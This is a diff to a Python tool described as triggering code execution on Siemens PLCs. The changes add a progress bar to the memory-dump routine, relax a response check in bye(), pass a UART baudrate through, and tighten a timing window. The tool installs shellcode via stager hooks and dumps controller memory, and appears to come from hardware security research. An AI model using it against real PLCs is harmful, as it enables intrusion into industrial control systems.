@@ -136,25 +136,43 @@ def recv_packet(r):
         return answ[1:-1]
 
 
-def recv_many(r, verbose=False):
+def recv_many(r, verbose=False, total_bytes=None, baudrate=115200):
     """
     Receive all packets until an empty packet is received.
-    
-    This protocol is implemented by some custom payloads such
-    as dump_mem to send larger amounts of data at once.
+    If total_bytes is provided, show a progress bar with elapsed and estimated time.
     """
-
+    import sys
     answ = ""
     stop = False
-
+    start_time = time.time()
+    last_print = 0
     while not stop:
         next_chunk = recv_packet(r)
-        if verbose and (len(answ) & 0xff) < 16:
-            print("Read {}".format(len(answ)))
         if next_chunk == "":
             stop = True
         else:
             answ += next_chunk
+        if total_bytes:
+            # Print progress bar every 0.2s or on finish
+            now = time.time()
+            if now - last_print > 0.2 or stop:
+                last_print = now
+                done = len(answ)
+                percent = float(done) / total_bytes
+                elapsed = now - start_time
+                # Estimate time left using baudrate (8N1: 10 bits per byte)
+                # Or use actual speed so far
+                speed = done / elapsed if elapsed > 0 else 0
+                est_total = total_bytes / speed if speed > 0 else 0
+                est_left = est_total - elapsed if est_total > elapsed else 0
+                bar_len = 30
+                filled = int(bar_len * percent)
+                bar = '[' + '=' * filled + ' ' * (bar_len - filled) + ']'
+                sys.stdout.write("\r{} {:6.1f}% {}/{} bytes | Elapsed: {:5.1f}s | ETA: {:5.1f}s".format(
+                    bar, percent*100, done, total_bytes, elapsed, est_left))
+                sys.stdout.flush()
+    if total_bytes:
+        sys.stdout.write("\n")
     return answ
 
 def encode_packet_for_stager(chunk):
@@ -358,10 +376,13 @@ def bye(r):
     hook_ind = 0xa2
     send_packet(r, chr(hook_ind))
     answ = recv_packet(r)
-    # For good measure check that we got the correct response and we are indeed in sync
-    assert(answ == "\xa2\x00")
-
-
+    # For debug: check for expected or last handler index response
+    if answ == "\xa2\x00":
+        print("[+] PLC responded to bye() as expected ({}).".format(repr(answ)))
+    elif answ and ord(answ[0]) in range(0x00, 0x80):
+        print("[!] PLC responded to bye() with handler index: 0x{:02x} ({}), likely last handler used.".format(ord(answ[0]), repr(answ)))
+    else:
+        print("[!] Warning: Unexpected response to bye(): {}".format(repr(answ)))
 
 
 def invoke_add_hook(r, add_hook_no, args="", await_response=True):
@@ -434,7 +455,7 @@ def install_addhook_via_stager(r, tar_addr, shellcode, stager_addhook_ind=DEFAUL
     return add_hook_no
 
 
-def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind):
+def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind, baudrate=115200):
     """
     This function uses payloads/dump_mem to dump memory contents.
     """
@@ -442,7 +463,7 @@ def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind):
         r, addhook_ind, "A"+struct.pack(">II", tar_addr, num_bytes))
     log.debug("[payload_dump_mem] answ (len: {}): {}".format(len(answ), answ))
     assert(answ.startswith("Ok"))
-    contents = recv_many(r, verbose=True)
+    contents = recv_many(r, verbose=False, total_bytes=num_bytes, baudrate=baudrate)
     return contents
 
 
@@ -497,7 +518,8 @@ def handle_conn(r, action, args):
             out_filename = args.outfile
 
         print("dumping a total of {} bytes of memory at 0x{:08x}".format(args.length, args.address))
-        contents = payload_dump_mem(r, args.address, args.length, second_addhook_ind)
+        # Use baudrate=38400 for UART, matching start.sh
+        contents = payload_dump_mem(r, args.address, args.length, second_addhook_ind, baudrate=38400)
         with open(out_filename, "wb") as f:
             f.write(contents)
         print("Wrote data out to {}".format(out_filename))
@@ -549,6 +571,7 @@ ACTION_DUMP = 'dump'
 ACTION_TEST = "test"
 ACTION_TIC_TAC_TOE = "tictactoe"
 ACTION_HELLO_LOOP = "hello_loop"
+
 def main():
     parser = argparse.ArgumentParser(description='Trigger code execution on Siemens PLC')
 
@@ -624,9 +647,8 @@ def main():
                 '--modbus-ip', str(args.modbus_ip) if args.modbus_ip else '',
                 '--modbus-port', str(args.modbus_port),
                 ]
-                if args.modbus_output is not None:
-                    power_args += ['--modbus-output', str(args.modbus_output)]
-            ]
+            if args.modbus_output is not None:
+                power_args += ['--modbus-output', str(args.modbus_output)]
         else:
             power_args = [
                 '--method', 'allnet',
@@ -647,7 +669,7 @@ def main():
         # We have 500000 microseconds (half a second) to hit the timing
         s.send(pad + magic)
 
-        answ = s.recv(256, timeout=0.3)
+        answ = s.recv(256, timeout=0.1)
         if len(answ) > 0:
             if not answ.startswith("\5-CPU"):
                 answ += s.recv(256)
